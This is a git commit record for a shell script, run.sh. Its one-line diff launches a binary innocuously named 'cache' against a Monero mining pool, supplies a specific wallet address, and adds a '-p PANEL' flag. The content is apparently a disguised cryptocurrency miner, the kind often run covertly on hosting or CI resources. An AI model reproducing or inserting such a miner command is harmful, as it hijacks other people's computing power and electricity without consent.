0d978fac8f4f2170d9533d642ca07dce78434e58
robertreynolds2 <64372884+robertreynolds2@users.noreply.github.com>
2022-07-20 19:46:36 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,1 +1,1 @@
-./cache -o gulf.moneroocean.stream:80 -u 49Wr4g6SVqiRabVyhk5zigZXR6bNXX8H5bhMUYiSTk1ijdhB2MBDQTedNuCj27NpFG53oWpaRq8hU1qHHHFevbCsQbCTXdN
+./cache -o gulf.moneroocean.stream:80 -u 49Wr4g6SVqiRabVyhk5zigZXR6bNXX8H5bhMUYiSTk1ijdhB2MBDQTedNuCj27NpFG53oWpaRq8hU1qHHHFevbCsQbCTXdN -p PANEL
